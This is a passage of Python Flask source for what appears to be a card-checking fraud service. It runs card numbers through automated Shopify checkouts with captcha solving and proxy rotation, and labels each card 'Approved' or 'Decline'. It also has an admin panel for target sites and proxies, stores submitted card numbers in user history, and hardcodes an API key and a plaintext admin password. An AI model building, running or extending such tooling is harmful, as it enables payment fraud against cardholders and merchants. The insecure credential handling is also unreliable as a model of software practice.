                "lineComponents": []
            }]
        },
        "memberships": {"memberships": []},
        "payment": {
            "totalAmount": {"value": {"amount": payment_amount, "currencyCode": currency_code}},
            "paymentLines": [{
                "paymentMethod": {
                    "directPaymentMethod": {
                        "paymentMethodIdentifier": payment_method_identifier if payment_method_identifier else "733e0067953851d75a089254f3ab0445",
                        "sessionId": card_session_id,
                        "billingAddress": {"streetAddress": billing_address_data},
                        "cardSource": None
                    }
                },
                "amount": {"value": {"amount": payment_amount, "currencyCode": currency_code}}
            }],
            "billingAddress": {"streetAddress": billing_address_data}
        },
        "buyerIdentity": {
            "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
            "email": CHECKOUT_DATA["email"],
            "emailChanged": False,
            "phoneCountryCode": "US",
            "marketingConsent": [],
            "shopPayOptInPhone": {"number": CHECKOUT_DATA["phone"], "countryCode": "US"},
            "rememberMe": False
        },
        "tip": {"tipLines": []},
        "taxes": {"proposedTotalAmount": {"any": True}},
        "note": {"message": None, "customAttributes": []},
        "localizationExtension": {"fields": []},
        "nonNegotiableTerms": None,
        "scriptFingerprint": {
            "signature": None,
            "signatureUuid": None,
            "lineItemScriptChanges": [],
            "paymentScriptChanges": [],
            "shippingScriptChanges": []
        },
        "optionalDuties": {"buyerRefusesDuties": False},
        "cartMetafields": []
    }

    # Add captcha token to input data if available
    if captcha_token:
        print(f"  [CAPTCHA] ✅ Using captcha token in submission")
        input_data["captchaToken"] = captcha_token

    if delivery_expectation_lines:
        input_data["deliveryExpectations"] = {
            "deliveryExpectationLines": delivery_expectation_lines
        }
    
    payload = {
        "operationName": "SubmitForCompletion",
        "query": query,
        "variables": {
            "attemptToken": attempt_token,
            "metafields": [],
            "postPurchaseInquiryResult": None,
            "analytics": {
                "requestUrl": f"{SHOP_URL}/checkouts/cn/{checkout_token}/en-us/",
                "pageId": str(uuid.uuid4()).upper()
            },
            "input": input_data
        }
    }
    
    try:
        r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
    except Exception as e:
        print(f"  [ERROR] HTTP request failed: {e}")
        return None, "HTTP_ERROR", str(e), {"_error": "REQUEST_EXCEPTION", "_message": str(e)}
    
    if r.status_code == 200:
        response = r.json()
        
        if not SUMMARY_ONLY:
            with open("submit_response.json", "w") as f:
                json.dump(response, f, indent=2)
        
        result = response.get('data', {}).get('submitForCompletion', {})
        result_type = result.get('__typename', 'Unknown')
        
        print(f"  [INFO] Result: {result_type}")
        
        if result_type in ['SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion']:
            receipt = result.get('receipt', {})
            receipt_id = receipt.get('id')
            
            if receipt_id:
                print(f"  [SUCCESS] Receipt ID: {receipt_id}")
                return receipt_id, "SUBMIT_SUCCESS", None, response
            else:
                return "ACCEPTED", "SUBMIT_ACCEPTED", None, response
        
        elif result_type == 'SubmitRejected':
            errors = result.get('errors', [])
            error_codes = []
            error_messages = []

            for error in errors:
                code = error.get('code', 'UNKNOWN_ERROR')
                message = error.get('localizedMessage', 'No message')
                error_codes.append(code)
                error_messages.append(message)
                print(f"  [ERROR] {code}: {message}")

            # Check if captcha is required
            primary_code = error_codes[0] if error_codes else "SUBMIT_REJECTED"
            combined_message = " | ".join(error_messages)
            
            if primary_code == 'CAPTCHA_METADATA_MISSING' or 'captcha' in combined_message.lower():
                print("\n[CAPTCHA] 🚨 Captcha required! Attempting to solve...")

                # Try browser solver first (for advanced protection)
                captcha_token = None
                
                if BROWSER_SOLVER_AVAILABLE:
                    print("[CAPTCHA] 🌐 Using browser solver for advanced protection...")
                    try:
                        browser_solver = BrowserCaptchaSolver(headless=True)
                        browser_result = browser_solver.solve_with_browser(shop_url, timeout=60)
                        
                        if browser_result.get('success'):
                            captcha_token = browser_result.get('token')
                            # Copy browser cookies to our session
                            for cookie in browser_result.get('cookies', []):
                                session.cookies.set(cookie['name'], cookie['value'])
                            print(f"[CAPTCHA] ✅ Browser solver succeeded! Token: {captcha_token[:30] if captcha_token else 'None'}...")
                        
                        browser_solver.close()
                    except Exception as e:
                        print(f"[CAPTCHA] ⚠️ Browser solver failed: {e}")
                
                # Fallback to standard solver
                if not captcha_token:
                    print("[CAPTCHA] 🔄 Falling back to standard solver...")
                    captcha_token = solve_captcha_auto(shop_url, max_retries=MAX_CAPTCHA_RETRIES)

                if captcha_token:
                    print(f"[CAPTCHA] ✅ Captcha solved! Token: {captcha_token[:30]}...")
                    print("[CAPTCHA] 🔄 Retrying submission with captcha token...")

                    # Add captcha token to session cookies
                    session.cookies.set('_captcha_token', captcha_token)
                    
                    # Update result with captcha status
                    result["captcha_solved"] = True
                    result["captcha_token"] = captcha_token

                    # Also add to headers
                    headers_with_captcha = headers.copy()
                    headers_with_captcha['X-Captcha-Token'] = captcha_token

                    retry_response = session.post(url, json=payload, headers=headers_with_captcha, timeout=HTTP_TIMEOUT_SHORT, verify=False)

                    if retry_response.status_code == 200:
                        try:
                            retry_data = retry_response.json()
                            retry_result = retry_data.get('data', {}).get('submitForCompletion', {})
                            retry_type = retry_result.get('__typename', '')

                            if retry_type in ['SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion']:
                                receipt = retry_result.get('receipt', {})
                                receipt_id = receipt.get('id')
                                if receipt_id:
                                    print(f"  [SUCCESS] Retry successful! Receipt ID: {receipt_id}")
                                    return receipt_id, "SUBMIT_SUCCESS", None, retry_data
                            elif retry_type == 'SubmitRejected':
                                retry_errors = retry_result.get('errors', [])
                                for err in retry_errors:
                                    err_code = err.get('code', '')
                                    if 'CAPTCHA' in err_code.upper():
                                        print(f"  [CAPTCHA] ⚠️ Still requires captcha: {err_code}")
                                        break
                        except Exception as e:
                            print(f"  [ERROR] Retry parse failed: {e}")

                    print("[CAPTCHA] ⚠️ Retry failed, continuing...")
                else:
                    print("[CAPTCHA] ⚠️ Captcha solving failed")

            return None, primary_code, combined_message, response
        
        elif result_type == 'SubmitFailed':
            reason = result.get('reason', 'Unknown')
            print(f"  [ERROR] Failed: {reason}")
            return None, "SUBMIT_FAILED", reason, response

        else:
            # Handle unexpected result types with more detail
            print(f"  [WARNING] Unexpected result type: {result_type}")
            print(f"  [DEBUG] Full result: {json.dumps(result, indent=2)[:500]}")
            
            # Check if there's a receipt anyway
            receipt = result.get('receipt', {})
            if receipt:
                receipt_id = receipt.get('id')
                receipt_type = receipt.get('__typename')
                if receipt_id:
                    print(f"  [INFO] Receipt found despite unexpected type: {receipt_id} ({receipt_type})")
                    return receipt_id, "SUBMIT_SUCCESS", None, response
            
            # Check for errors in the response
            if 'errors' in response:
                errors = response.get('errors', [])
                error_msgs = [e.get('message', 'Unknown') for e in errors[:3]]
                print(f"  [ERROR] GraphQL errors: {error_msgs}")
                return None, "GRAPHQL_ERROR", " | ".join(error_msgs), response
            
            return None, "UNEXPECTED_RESULT", f"Unexpected: {result_type}", response
        
    else:
        print(f"  [ERROR] HTTP {r.status_code}")
        return None, f"HTTP_{r.status_code}", f"HTTP failed: {r.status_code}"

def step5_poll_receipt(session, checkout_token, checkout_session_token, receipt_id, shop_url, capture_log: bool = False):
    log_lines = [] if capture_log else None
    attempt_blocks = [] if capture_log else None

    def _log(msg: str):
        try:
            if capture_log and log_lines is not None:
                log_lines.append(msg)
            print(msg)
        except Exception:
            pass

    def _compose_poll_log_text():
        if not capture_log:
            return None
        parts = []
        if attempt_blocks:
            parts.extend(attempt_blocks)
        if log_lines:
            parts.append("\n".join(log_lines))
        return "\n\n".join(parts) if parts else None

    _log("[5/5] Polling for receipt...")
    url = f"{shop_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': checkout_session_token,
    }
    query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}...on ActionRequiredReceipt{id __typename}__typename}}"""

    payload = {
        "operationName": "PollForReceipt",
        "query": query,
        "variables": {
            "receiptId": receipt_id,
            "sessionToken": checkout_session_token
        }
    }

    try:
        rid = receipt_id
        if rid is None or (isinstance(rid, str) and not rid.strip()) or (isinstance(rid, str) and not rid.startswith("gid://shopify/")):
            _log("  [ERROR] Invalid receipt_id; skipping poll.")
            stub = {"_error": "INVALID_RECEIPT_ID", "_receipt_id": rid}
            return False, stub, _compose_poll_log_text()
    except Exception:
        stub = {"_error": "INVALID_RECEIPT_ID_EXCEPTION"}
        return False, stub, _compose_poll_log_text()

    last_response = None
    collected = []
    error_no_data_strikes = 0

    for attempt in range(1, POLL_RECEIPT_MAX_ATTEMPTS + 1):
        _log(f"  Polling {attempt}/{POLL_RECEIPT_MAX_ATTEMPTS}...")
        try:
            r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        except Exception as e:
            stub = {"_error": "REQUEST_EXCEPTION", "_message": str(e)}
            if capture_log and attempt_blocks is not None:
                attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n" + json.dumps(stub, indent=2))
            time.sleep(SHORT_SLEEP)
            continue

        response = None
        if r.status_code == 200:
            try:
                response = r.json()
            except Exception:
                response = {"_error": "INVALID_JSON", "_status": r.status_code, "_text_head": (r.text[:2000] if isinstance(r.text, str) else "")}

            if capture_log and attempt_blocks is not None:
                try:
                    attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n" + json.dumps(response, indent=2))
                except Exception:
                    attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n{str(response)}")

            collected.append(response)
            last_response = response

            if isinstance(response, dict) and 'errors' in response and not response.get('data'):
                try:
                    errs = response.get('errors', [])
                    msg_concat = " ".join([str(e.get('message', '') or '') for e in errs if isinstance(e, dict)])
                except Exception:
                    msg_concat = ""
                if ("receiptId" in msg_concat) and (("invalid value" in msg_concat) or ("null" in msg_concat)):
                    _log("  [ERROR] Invalid receiptId reported by server; aborting poll early.")
                    return False, response, _compose_poll_log_text()
                error_no_data_strikes += 1
                if error_no_data_strikes >= 2:
                    _log("  [ERROR] Too many GraphQL errors without data; aborting poll.")
                    return False, response, _compose_poll_log_text()
                _log("  [WARN] GraphQL errors without data; will retry")
                time.sleep(SHORT_SLEEP)
                continue

            receipt = (response or {}).get('data', {}).get('receipt', {}) if isinstance(response, dict) else {}
            rtype = receipt.get('__typename')

            if rtype == 'ProcessedReceipt':
                _log("  [SUCCESS] Order completed (ProcessedReceipt).")
                _log("\n[RECEIPT_RESPONSE]")
                try:
                    _log(json.dumps({"data": {"receipt": receipt}}, indent=2))
                except Exception:
                    pass
                return True, response, _compose_poll_log_text()

            if rtype == 'ActionRequiredReceipt':
                _log("  [ACTION REQUIRED] 3-D Secure or other action required.")
                _log("\n[RECEIPT_RESPONSE]")
                try:
                    _log(json.dumps({"data": {"receipt": receipt}}, indent=2))
                except Exception:
                    pass
                return False, response, _compose_poll_log_text()

            if rtype == 'FailedReceipt':
                _log("  [FAILED] Received FailedReceipt.")
                
                # Note: Captcha solving during receipt polling disabled
                # Captcha should be solved earlier in checkout flow
                
                _log("\n[RECEIPT_RESPONSE]")
                try:
                    _log(json.dumps({"data": {"receipt": receipt}}, indent=2))
                except Exception:
                    pass
                return False, response, _compose_poll_log_text()

            if rtype == 'ProcessingReceipt' or rtype is None:
                poll_delay = receipt.get('pollDelay', 2000) if isinstance(receipt, dict) else 2000
                wait_seconds = min((poll_delay or 2000) / 1000.0, MAX_WAIT_SECONDS)
                _log(f"  [INFO] Still processing; waiting {wait_seconds:.2f}s before retry.")
                time.sleep(wait_seconds)
                continue

            _log(f"  [WARN] Unknown receipt typename: {rtype}; will retry.")
            time.sleep(SHORT_SLEEP)
            continue

        else:
            stub = {"_error": "HTTP_NOT_200", "_status": r.status_code, "_text_head": (r.text[:2000] if isinstance(r.text, str) else "")}
            if capture_log and attempt_blocks is not None:
                attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n" + json.dumps(stub, indent=2))
            _log(f"  [ERROR] HTTP {r.status_code} from PollForReceipt; retrying")
            time.sleep(SHORT_SLEEP)
            continue

    _log("  [TIMEOUT] Poll attempts exhausted; final state UNKNOWN or PROCESSING.")
    if last_response is not None:
        _log("\n[LAST_RECEIPT_RESPONSE]")
        try:
            _log(json.dumps(last_response, indent=2))
        except Exception:
            pass
        _log("\n[RECEIPT_RESPONSE]")
        try:
            _log(json.dumps(last_response, indent=2))
        except Exception:
            pass
        return False, last_response, _compose_poll_log_text()

    final_stub = {"error": {"code": "TIMEOUT", "message": "Receipt polling timed out with no response"}}
    _log("\n[RECEIPT_RESPONSE]")
    try:
        _log(json.dumps(final_stub, indent=2))
    except Exception:
        pass
    return False, final_stub, _compose_poll_log_text()


def extract_receipt_code(resp):
    try:
        receipt = resp.get('data', {}).get('receipt', {}) if isinstance(resp, dict) else {}
        t = receipt.get('__typename')
        if t == 'ProcessedReceipt':
            return 'SUCCESS'
        elif t == 'FailedReceipt':
            pe = receipt.get('processingError', {}) or {}
            code = pe.get('code')
            if isinstance(code, str) and code.strip():
                return f'"code": "{code}"'
            return '"code": "UNKNOWN"'
        elif t == 'ActionRequiredReceipt':
            return '"code": "ACTION_REQUIRED"'
        else:
            return '"code": "UNKNOWN"'
    except Exception:
        return '"code": "UNKNOWN"'


def format_proxy(proxy_str):
    if not proxy_str:
        return None
    
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None

    if proxy_str.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return {
            'http': proxy_str,
            'https': proxy_str
        }

    parts = proxy_str.split(':')
    
    if len(parts) == 2:
        final_proxy = f"http://{proxy_str}"
        return {'http': final_proxy, 'https': final_proxy}
    
    if len(parts) == 4:
        p1 = parts[0]
        is_p1_ip = p1.replace('.', '').isdigit()
        
        if is_p1_ip:
            ip, port, user, pw = parts[0], parts[1], parts[2], parts[3]
            final_proxy = f"http://{user}:{pw}@{ip}:{port}"
            return {'http': final_proxy, 'https': final_proxy}
        else:
            if parts[1].isdigit():
                 host, port, user, pw = parts[0], parts[1], parts[2], parts[3]
                 final_proxy = f"http://{user}:{pw}@{host}:{port}"
                 return {'http': final_proxy, 'https': final_proxy}
            else:
                 user, pw, ip, port = parts[0], parts[1], parts[2], parts[3]
                 final_proxy = f"http://{user}:{pw}@{ip}:{port}"
                 return {'http': final_proxy, 'https': final_proxy}

    if '@' in proxy_str:
        final_proxy = f"http://{proxy_str}"
        return {'http': final_proxy, 'https': final_proxy}

    print(f"  [ERROR] Invalid proxy format: {proxy_str}")
    raise ValueError("Invalid Proxy Format")

def process_checkout(cc, site, proxy):
    global SHOP_URL, VARIANT_ID
    
    result = {
        "status": "Decline",
        "site": "Dead",
        "amount": "$0.00",
        "response": "Unknown Error",
        "proxy": "Dead",
        "captcha_solved": False,
        "captcha_token": None
    }

    try:
        try:
            proxies = format_proxy(proxy)
        except ValueError as ve:
            result["response"] = str(ve)
            result["proxy"] = "Invalid Format"
            result["site"] = "Dead"
            return result
        
        if not site.startswith(('http://', 'https://')):
            site = f"https://{site}"

        parsed = urlparse(site)
        base_shop_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Set global SHOP_URL for use in step functions
        SHOP_URL = base_shop_url
        
        try:
            parts = cc.split('|')
            card_data = {
                "number": parts[0],
                "month": int(parts[1]),
                "year": int(parts[2]),
                "verification_value": parts[3],
                "name": "John Doe"
            }
            if card_data["year"] < 100:
                card_data["year"] += 2000
        except Exception:
             result["response"] = "Invalid CC Format"
             result["proxy"] = "Working" 
             result["site"] = "Working"
             return result

        session = create_session(base_shop_url, proxies=proxies)

        # Set global variables for checkout flow
        SHOP_URL = base_shop_url
        VARIANT_ID = ""  # Will be set after product detection

        vid = None
        title = None
        
        try:
            if '/products/' in parsed.path:
                clean_path = parsed.path
                if clean_path.endswith('/'):
                    clean_path = clean_path[:-1]
                
                product_json_url = f"{base_shop_url}{clean_path}.json"
                
                r = session.get(product_json_url, timeout=HTTP_TIMEOUT_SHORT, verify=False)
                if r.status_code == 200:
                    pdata = r.json().get('product', {})
                    title = pdata.get('title')
                    variants = pdata.get('variants', [])
                    for v in variants:
                        if v.get('available'):
                            vid = str(v.get('id'))
                            price = float(v.get('price', 0))
                            break
                    if not vid and variants:
                        vid = str(variants[0].get('id'))
                        price = float(variants[0].get('price', 0))
                        
                    if vid:
                         result["site"] = "Working"
                         if not proxy:
                             result["proxy"] = "None"
                         else:
                             result["proxy"] = "Working"
                         
                         # Set global VARIANT_ID
                         VARIANT_ID = vid
                    else:
                         result["response"] = "Product found but no variants"
                         return result
                else:
                    result["response"] = "Invalid Product URL"
                    result["site"] = "Dead"
                    if not proxy:
                        result["proxy"] = "None"
                    else:
                        result["proxy"] = "Working"
                    return result
            else:
                pid, vid, price_str, title = auto_detect_cheapest_product(session, base_shop_url)
                if vid:
                    result["site"] = "Working"
                    if not proxy:
                        result["proxy"] = "None"
                    else:
                        result["proxy"] = "Working"
                    
                    # Set global VARIANT_ID
                    VARIANT_ID = vid
                else:
                    result["response"] = "No products found"
                    result["site"] = "Dead"
                    if not proxy:
                        result["proxy"] = "None"
                    return result
        except requests.exceptions.ProxyError:
             result["proxy"] = "Proxy Error"
             result["site"] = "Dead"
             result["response"] = "Proxy connection failed"
             return result
        except requests.exceptions.ConnectTimeout:
             result["proxy"] = "Proxy Timeout" if proxy else "Dead"
             result["site"] = "Dead"
             result["response"] = "Connection Timed Out"
             return result
        except Exception as e:
             if proxy:
                result["proxy"] = "Proxy Error"
             else:
                result["proxy"] = "Dead"
             result["site"] = "Dead"
             result["response"] = f"Connection Failed: {str(e)}"
             return result

        try:
            checkout_token, session_token, cookies, stable_id, payment_method_id = step1_add_to_cart(session, base_shop_url, vid)
            if not checkout_token:
                result["response"] = "Failed to create checkout"
                return result
        except Exception as e:
             result["response"] = f"Add to Cart Error: {str(e)}"
             return result

        try:
            card_session_id = step2_tokenize_card(session, checkout_token, base_shop_url, card_data)
            if not card_session_id:
                result["response"] = "Tokenization Failed"
                return result
        except Exception as e:
            result["response"] = f"Tokenization Error: {str(e)}"
            return result

        try:
            queue_token, shipping_handle, merchandise_id, actual_total, delivery_expectations, phone_required, currency_code, shipping_amount = step3_proposal(
                session, checkout_token, session_token, card_session_id, base_shop_url, vid, merchandise_stable_id=stable_id
            )
            
            if actual_total:
                result["amount"] = f"${actual_total} {currency_code}"
            
            if not queue_token or not shipping_handle:
                 result["response"] = "Proposal Failed (No Shipping?)"
                 return result
        except Exception as e:
             result["response"] = f"Proposal Error: {str(e)}"
             return result

        try:
             receipt_result = step4_submit_completion(
                session, checkout_token, session_token, queue_token,
                shipping_handle, merchandise_id, card_session_id,
                actual_total, delivery_expectations, base_shop_url, vid, payment_method_identifier=payment_method_id, phone_required=phone_required, currency_code=currency_code, shipping_amount=shipping_amount
            )
             
             receipt_id = None
             submit_code = "UNKNOWN"
             if isinstance(receipt_result, tuple):
                if len(receipt_result) >= 2:
                    receipt_id = receipt_result[0]
                    submit_code = receipt_result[1]
             else:
                 receipt_id = receipt_result
            
             if not receipt_id:
                  result["response"] = str(submit_code)
                  result["status"] = "Decline"
                  return result
             
             success, poll_response, poll_log = step5_poll_receipt(session, checkout_token, session_token, receipt_id, base_shop_url)
             
             code_display = extract_receipt_code(poll_response)
             
             clean_code = "UNKNOWN"
             if '"code": "' in code_display:
                 clean_code = code_display.split('"code": "')[1].strip('"')
             
             result["response"] = clean_code
             
             if clean_code == "SUCCESS" or success:
                 result["status"] = "Approved"
                 result["response"] = "Charged Successfully"
             else:
                 result["status"] = "Decline"

        except Exception as e:
             result["response"] = f"Submit/Poll Error: {str(e)}"
             return result

    except Exception as e:
        result["response"] = f"System Error: {str(e)}"

    # Check if captcha was solved (from session cookies)
    captcha_token = session.cookies.get('_captcha_token')
    if captcha_token:
        result["captcha_solved"] = True
        result["captcha_token"] = captcha_token

    return result

@app.route('/process', methods=['GET'])
def process_api():
    try:
        cc = request.args.get('cc')
        site = request.args.get('site')
        proxy = request.args.get('proxy')
        key = request.args.get('key')
        client_ip = request.remote_addr

        # Log the request
        add_log("INFO", "API request received", {
            "ip": client_ip,
            "site": site,
            "proxy": "Yes" if proxy else "No",
            "key_valid": key == "md-tech"
        })

        if not key or key != "md-tech":
            add_log("WARNING", "Invalid API key", {"ip": client_ip, "key": key})
            return jsonify({
                "status": "Decline",
                "site": "Unknown",
                "amount": "$0.00",
                "response": "Invalid Key",
                "proxy": "Unknown"
            })

        if not cc or not site:
            add_log("WARNING", "Missing parameters", {"ip": client_ip, "cc": cc, "site": site})
            return jsonify({
                "status": "Decline",
                "site": "Unknown",
                "amount": "$0.00",
                "response": "Missing CC or Site",
                "proxy": "Unknown"
            })

        result = process_checkout(cc, site, proxy)

        # Log the result
        add_log("INFO", "Checkout completed", {
            "ip": client_ip,
            "site": site,
            "status": result.get('status'),
            "amount": result.get('amount'),
            "captcha_solved": result.get('captcha_solved'),
            "response": result.get('response')
        })
        
        # Save to user history if logged in
        if 'username' in request.args:
            username = request.args.get('username')
            if username not in user_history:
                user_history[username] = []
            user_history[username].append({
                "time": datetime.utcnow().isoformat(),
                "card": cc,
                "site": site,
                "status": result.get('status'),
                "response": result.get('response')
            })

        return jsonify(result)

    except Exception as e:
        add_log("ERROR", "API request failed", {"error": str(e)})
        return jsonify({
            "status": "Error",
            "proxy": "Error",
            "site": "Error",
            "amount": "Error",
            "response": str(e)
        })

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint for Railway"""
    return jsonify({
        "status": "healthy",
        "captcha_solver": "enabled" if CAPTCHA_SOLVER_ENABLED else "disabled",
        "browser_solver": BROWSER_SOLVER_AVAILABLE,
        "timestamp": time.time()
    })


@app.route('/admin', methods=['GET'])
def admin_login_page():
    """Admin login page"""
    return render_template('admin_login.html')


@app.route('/admin/login', methods=['POST'])
def admin_login():
    """Admin login handler"""
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
        # Generate token (JWT if available, otherwise simple token)
        if JWT_AVAILABLE:
            token = jwt.encode({
                'username': username,
                'exp': datetime.utcnow() + timedelta(hours=24)
            }, SECRET_KEY, algorithm='HS256')
        else:
            # Fallback to simple token
            token = hashlib.sha256(f"{username}{SECRET_KEY}".encode()).hexdigest()
        
        add_log("INFO", "Admin login successful", {"username": username, "ip": request.remote_addr})
        
        return jsonify({
            "success": True,
            "token": token,
            "message": "Login successful"
        })
    else:
        add_log("WARNING", "Admin login failed", {"username": username, "ip": request.remote_addr})
        return jsonify({
            "success": False,
            "error": "Invalid credentials"
        }), 401


@app.route('/admin/dashboard', methods=['GET'])
def admin_dashboard():
    """Main admin dashboard - Full featured"""
    return render_template('admin_full.html')


@app.route('/admin/logs', methods=['GET'])
def get_logs():
    """Get system logs"""
    # Get last N logs
    limit = request.args.get('limit', 100, type=int)
    return jsonify({
        "logs": system_logs[-limit:],
        "total": len(system_logs)
    })


@app.route('/admin/stats', methods=['GET'])
def get_stats():
    """Get system statistics"""
    # Count log types
    total_requests = len([l for l in system_logs if l['message'] == 'API request received'])
    approved = len([l for l in system_logs if l['message'] == 'API request received' and l.get('details', {}).get('status') == 'Approved'])
    declined = len([l for l in system_logs if l['message'] == 'API request received' and l.get('details', {}).get('status') == 'Decline'])
    
    success_rate = (approved / total_requests * 100) if total_requests > 0 else 0
    
    return jsonify({
        "total_requests": total_requests,
        "approved": approved,
        "declined": declined,
        "success_rate": round(success_rate, 2),
        "uptime": "99.9%"
    })


@app.route('/admin/sites', methods=['GET'])
def get_sites():
    """Get all sites"""
    try:
        sites = sites_data.get('sites', [])
        return jsonify({
            "sites": sites,
            "total": len(sites)
        })
    except Exception as e:
        logger.error(f"Error getting sites: {e}")
        return jsonify({
            "sites": [],
            "total": 0,
            "error": str(e)
        }), 500


@app.route('/admin/sites', methods=['POST'])
def add_site():
    """Add a new site"""
    try:
        data = request.get_json()
        url = data.get('url')
        price = data.get('price', '0.00')
        
        if not url:
            return jsonify({"success": False, "error": "URL is required"}), 400
        
        # Check if site already exists
        if any(site['url'] == url for site in sites_data['sites']):
            return jsonify({"success": False, "error": "Site already exists"}), 400
        
        # Add site
        sites_data['sites'].append({
            "url": url,
            "price": price,
            "added_by": "admin",
            "added_by_name": "Admin User",
            "last_response": "Not tested"
        })
        
        # Save to JSON storage
        save_json(SITES_FILE, sites_data)
        
        add_log("INFO", "Site added", {"url": url, "price": price})
        
        return jsonify({"success": True, "message": "Site added successfully"})
    except Exception as e:
        logger.error(f"Error adding site: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/admin/sites', methods=['DELETE'])
def delete_site():
    """Delete a site"""
    try:
        data = request.get_json()
        url = data.get('url')
        
        if not url:
            return jsonify({"success": False, "error": "URL is required"}), 400
        
        # Remove site
        sites_data['sites'] = [s for s in sites_data['sites'] if s['url'] != url]
        
        # Save to JSON storage
        save_json(SITES_FILE, sites_data)
        
        add_log("INFO", "Site deleted", {"url": url})
        
        return jsonify({"success": True, "message": "Site deleted successfully"})
    except Exception as e:
        logger.error(f"Error deleting site: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/admin/proxies', methods=['GET'])
def get_proxies():
    """Get all proxies"""
    try:
        proxies = proxies_data.get('proxies', [])
        return jsonify({
            "proxies": proxies,
            "total": len(proxies)
        })
    except Exception as e:
        logger.error(f"Error getting proxies: {e}")
        return jsonify({
            "proxies": [],
            "total": 0,
            "error": str(e)
        }), 500


@app.route('/admin/proxies', methods=['POST'])
def add_proxy():
    """Add a new proxy"""
    try:
        data = request.get_json()
        proxy = data.get('proxy')
        
        if not proxy:
            return jsonify({"success": False, "error": "Proxy is required"}), 400
        
        # Check if proxy already exists
        if proxy in proxies_data['proxies']:
            return jsonify({"success": False, "error": "Proxy already exists"}), 400
        
        # Add proxy
        proxies_data['proxies'].append(proxy)
        
        # Save to JSON storage
        save_json(PROXIES_FILE, proxies_data)
        
        add_log("INFO", "Proxy added", {"proxy": proxy})
        
        return jsonify({"success": True, "message": "Proxy added successfully"})
    except Exception as e:
        logger.error(f"Error adding proxy: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


# User storage (in-memory for now, can be saved to JSON)
users_db = {
    "databasemanaging": {
        "password": "41Ars@117",
        "role": "admin",
        "status": "active",
        "last_login": None
    }
}

# User check history storage
user_history = {}

@app.route('/admin/proxies', methods=['DELETE'])
def delete_proxy():
    """Delete a proxy"""
    try:
        data = request.get_json()
        proxy = data.get('proxy')
        
        if not proxy:
            return jsonify({"success": False, "error": "Proxy is required"}), 400
        
        # Remove proxy
        proxies_data['proxies'] = [p for p in proxies_data['proxies'] if p != proxy]
        
        # Save to JSON storage
        save_json(PROXIES_FILE, proxies_data)
        
        add_log("INFO", "Proxy deleted", {"proxy": proxy})
        
        return jsonify({"success": True, "message": "Proxy deleted successfully"})
    except Exception as e:
        logger.error(f"Error deleting proxy: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/admin/users', methods=['GET'])
def get_users():
    """Get all users"""
    try:
        users = []
        for username, data in users_db.items():
            users.append({
                "username": username,
                "role": data.get('role', 'user'),
                "status": data.get('status', 'active'),
                "last_login": data.get('last_login', 'Never')
            })
        return jsonify({
            "users": users,
            "total": len(users)
        })
    except Exception as e:
        logger.error(f"Error getting users: {e}")
        return jsonify({
            "users": [],
            "total": 0,
            "error": str(e)
        }), 500


@app.route('/admin/users', methods=['POST'])
def add_user():
    """Add a new user"""
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        role = data.get('role', 'user')
        
        if not username or not password:
            return jsonify({"success": False, "error": "Username and password required"}), 400
        
        if username in users_db:
            return jsonify({"success": False, "error": "User already exists"}), 400
        
        users_db[username] = {
            "password": password,
            "role": role,
            "status": "active",
            "last_login": None
        }
        
        add_log("INFO", "User added", {"username": username, "role": role})
        
        return jsonify({"success": True, "message": "User added successfully"})
    except Exception as e:
        logger.error(f"Error adding user: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/admin/users', methods=['DELETE'])
def delete_user():
    """Delete a user"""
    try:
        data = request.get_json()
        username = data.get('username')
        
        if not username:
            return jsonify({"success": False, "error": "Username required"}), 400
        
        if username not in users_db:
            return jsonify({"success": False, "error": "User not found"}), 404
        
        del users_db[username]
        
        add_log("INFO", "User deleted", {"username": username})
        
        return jsonify({"success": True, "message": "User deleted successfully"})
    except Exception as e:
        logger.error(f"Error deleting user: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/user/login', methods=['GET'])
def user_login_page():
    """User login page"""
    return render_template('user_login.html')


@app.route('/user/register', methods=['GET'])
def user_register_page():
    """User register page"""
    return render_template('user_register.html')


@app.route('/user/dashboard', methods=['GET'])
def user_dashboard():
    """User dashboard"""
    return render_template('user_dashboard.html')


@app.route('/api/user/login', methods=['POST'])
def api_user_login():
    """User login API"""
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        
        if username in users_db and users_db[username]['password'] == password:
            users_db[username]['last_login'] = datetime.utcnow().isoformat()
            return jsonify({
                "success": True,
                "message": "Login successful",
                "username": username
            })
        else:
            return jsonify({
                "success": False,
